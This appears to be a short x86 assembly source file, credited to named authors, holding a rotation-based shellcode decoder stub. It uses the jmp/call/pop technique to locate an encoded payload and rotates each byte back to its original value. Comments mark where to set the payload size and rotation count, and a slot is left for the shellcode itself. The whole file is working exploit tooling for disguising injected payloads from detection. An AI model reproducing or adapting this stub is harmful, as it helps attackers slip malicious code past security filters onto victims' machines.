/*
 *  Coded by Rodrigo Rubira Branco <rodrigo@kernelhacking.com>
 *
 *  the %ecx register contains the size of assembly code (shellcode).
 *  Thanks to Ramon de Carvalho Valle (ramon@risesecurity.org)
 *
 *  movb    $0x01,%cl
 *             ^^
 *             size of assembly code (shellcode)
 *
 *  rolb    $0x00,(%esi)        [left rotation]
 *  rorb    $0x00,(%esi)        [right rotaion]
 *             ^^
 *             number of times to rotate
 */

label1:
    xorl    %ecx,%ecx
    movb    $0x00,%cl    /* <-- size of assembly code (shellcode) */
    jmp     label4

label2:
    popl    %esi
    
label3:
    rolb    $0x00,(%esi) /* <-- number of times to rotate */
    /* rorb $0x00,(%esi) */
    incl    %esi
    loop    label3

label4:
    call    label2

/* assembly code (shellcode) goes here */
